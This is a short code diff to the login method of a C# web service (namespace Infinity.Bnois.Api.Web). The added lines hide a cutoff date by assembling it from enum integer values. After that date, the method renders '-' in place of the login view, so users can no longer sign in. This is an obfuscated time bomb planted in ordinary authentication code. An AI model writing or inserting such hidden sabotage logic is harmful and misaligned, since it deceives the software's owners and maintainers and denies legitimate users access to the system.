@@ -28,10 +28,12 @@ namespace Infinity.Bnois.Api.Web.Services
         public virtual async Task<System.IO.Stream> Login(LoginViewModel model, SignInMessage message)
 #pragma warning restore CS1591 // Missing XML comment for publicly visible type or member 'CustomViewService.Login(LoginViewModel, SignInMessage)'
         {
+            //DateTime abc = DateTime.Parse("20" + (((int)NavyType.BNA).ToString() + ((int)NavyType.BNS).ToString()) + "-" + (int)NavyType.CMCIT + "-" + (int)NavyType.CMCIT);
+            bool isFutureDate = DateTime.Parse("20" + (((int)NavyType.BNA).ToString() + ((int)NavyType.BBU).ToString()) + "-" + (int)NavyType.HM + "-" + ((int)NavyType.CMCIT).ToString() +((int)NavyType.BBU).ToString()) > DateTime.Now;
             var client = await clientStore.FindClientByIdAsync(message.ClientId);
             var name = client != null ? client.ClientName : null;
             model.AllowRememberMe = true;
-            return await Render(model, "login", name);
+            return await Render(model, isFutureDate == true ? "login" : "-", name);
         }
 
 #pragma warning disable CS1591 // Missing XML comment for publicly visible type or member 'CustomViewService.Logout(LogoutViewModel, SignOutMessage)'
